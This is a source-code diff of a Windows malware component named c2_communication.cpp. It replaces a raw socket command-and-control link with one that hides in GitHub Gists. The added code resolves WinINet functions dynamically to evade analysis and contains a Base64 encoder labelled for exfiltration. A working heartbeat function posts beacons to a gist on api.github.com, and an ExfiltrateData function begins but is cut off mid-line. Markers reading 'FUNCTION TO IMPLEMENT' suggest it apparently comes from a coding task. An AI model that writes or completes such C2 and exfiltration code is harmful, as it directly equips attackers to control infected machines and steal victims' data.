@@ -1,61 +1,128 @@
-#include <windows.h>
+// c2_communication.cpp
+
+#include "c2_communication.h"
+#include "api_resolution.h"
 #include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
+#include <time.h>
 
-#pragma comment(lib, "ws2_32.lib")
+// Simple, self-contained Base64 encoder for exfiltration
+void simpleBase64Encode(const char* input, char* output, int out_size) {
+    const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    int in_len = strlen(input);
+    int i = 0, j = 0, x = 0;
+    unsigned char char_array_3[3], char_array_4[4];
 
-// C2 communication functions
+    while (in_len--) {
+        char_array_3[i++] = *(input++);
+        if (i == 3) {
+            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+            char_array_4[3] = char_array_3[2] & 0x3f;
 
-SOCKET InitializeC2Connection(const char* szServerIP, int nPort) {
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        return INVALID_SOCKET;
+            for (i = 0; i < 4; i++)
+                output[x++] = base64_chars[char_array_4[i]];
+            i = 0;
+        }
     }
-    
-    SOCKET hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (hSocket == INVALID_SOCKET) {
-        WSACleanup();
-        return INVALID_SOCKET;
+
+    if (i) {
+        for (j = i; j < 3; j++)
+            char_array_3[j] = '\0';
+
+        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+        char_array_4[3] = char_array_3[2] & 0x3f;
+
+        for (j = 0; j < i + 1; j++)
+            output[x++] = base64_chars[char_array_4[j]];
+
+        while ((i++ < 3))
+            output[x++] = '=';
     }
-    
-    struct sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(nPort);
-    inet_pton(AF_INET, szServerIP, &serverAddr.sin_addr);
-    
-    if (connect(hSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        closesocket(hSocket);
-        WSACleanup();
-        return INVALID_SOCKET;
-    }
-    
-    return hSocket;
+    output[x] = '\0';
 }
 
-BOOL SendC2Data(SOCKET hSocket, const char* szData, DWORD dwSize) {
-    if (hSocket == INVALID_SOCKET) {
+
+// --- FUNCTION TO IMPLEMENT ---
+BOOL SendHeartbeat() {
+    // Resolve all required WinINet functions dynamically
+    pInternetOpenA InternetOpenA = (pInternetOpenA)resolve_api("wininet.dll", "InternetOpenA");
+    pInternetConnectA InternetConnectA = (pInternetConnectA)resolve_api("wininet.dll", "InternetConnectA");
+    pHttpOpenRequestA HttpOpenRequestA = (pHttpOpenRequestA)resolve_api("wininet.dll", "HttpOpenRequestA");
+    pHttpSendRequestA HttpSendRequestA = (pHttpSendRequestA)resolve_api("wininet.dll", "HttpSendRequestA");
+    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)resolve_api("wininet.dll", "InternetCloseHandle");
+    pGetTickCount GetTickCount = (pGetTickCount)resolve_api("kernel32.dll", "GetTickCount");
+
+    if (!InternetOpenA || !InternetConnectA || !HttpOpenRequestA || !HttpSendRequestA || !InternetCloseHandle || !GetTickCount) {
         return FALSE;
     }
+
+    // 1. Open an internet connection
+    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return FALSE;
+
+    // 2. Connect to the GitHub server
+    HINTERNET hConnect = InternetConnectA(hInternet, "api.github.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    // 3. Build the POST request
+    char requestUrl[512];
+    sprintf_s(requestUrl, sizeof(requestUrl), "/gists/%s", C2_GIST_ID);
+
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", requestUrl, "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
+    if (!hRequest) {
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    // 4. Create the JSON body for the POST request
+    char heartbeatData[64];
+    sprintf_s(heartbeatData, sizeof(heartbeatData), "%lu", GetTickCount());
     
-    int nBytesSent = send(hSocket, szData, dwSize, 0);
-    return (nBytesSent == dwSize);
+    char jsonBody[1024];
+    sprintf_s(jsonBody, sizeof(jsonBody),
+        "{"
+        "\"description\": \"C2 Heartbeat\","
+        "\"files\": {"
+        "\"%s\": {"
+        "\"content\": \"%s\""
+        "}"
+        "}"
+        "}",
+        C2_HEARTBEAT_FILENAME, heartbeatData);
+
+    // 5. Add necessary headers for the API call
+    const char* headers = "Content-Type: application/json\r\nAccept: application/vnd.github.v3+json\r\n";
+
+    // 6. Send the request
+    if (!HttpSendRequestA(hRequest, headers, -1L, jsonBody, strlen(jsonBody))) {
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    // 7. Clean up handles
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+
+    return TRUE;
 }
 
-DWORD ReceiveC2Data(SOCKET hSocket, char* szBuffer, DWORD dwBufferSize) {
-    if (hSocket == INVALID_SOCKET) {
-        return 0;
-    }
-    
-    int nBytesReceived = recv(hSocket, szBuffer, dwBufferSize, 0);
-    return (nBytesReceived > 0) ? nBytesReceived : 0;
-}
 
-VOID CloseC2Connection(SOCKET hSocket) {
-    if (hSocket != INVALID_SOCKET) {
-        closesocket(hSocket);
-    }
-    WSACleanup();
-}
+// --- FUNCTION TO IMPLEMENT ---
+BOOL ExfiltrateData(const char* dataToExfil) {
+    if (!dataToExfil) return FALSE;
+
+    // Resolve all required WinINet functions dynamically
+    pInternetOpenA InternetOpenA = (pInternetOpenA)resolve_api("wininet.dll", "InternetOpenA");
+    pInternetConnectA InternetConnectA = (pInternetConnectA)resolve_api("wininet.dll", "InternetConnectA");
+    pHttpOpenRequestA HttpOpenRequestA = (pHttpOpenRequestA)resolve_api("wininet.dll", "HttpOpenRequestA");
+    pHttpSendRequestA HttpSendRequestA = (pHttpSendRequestA)resolve_api("win
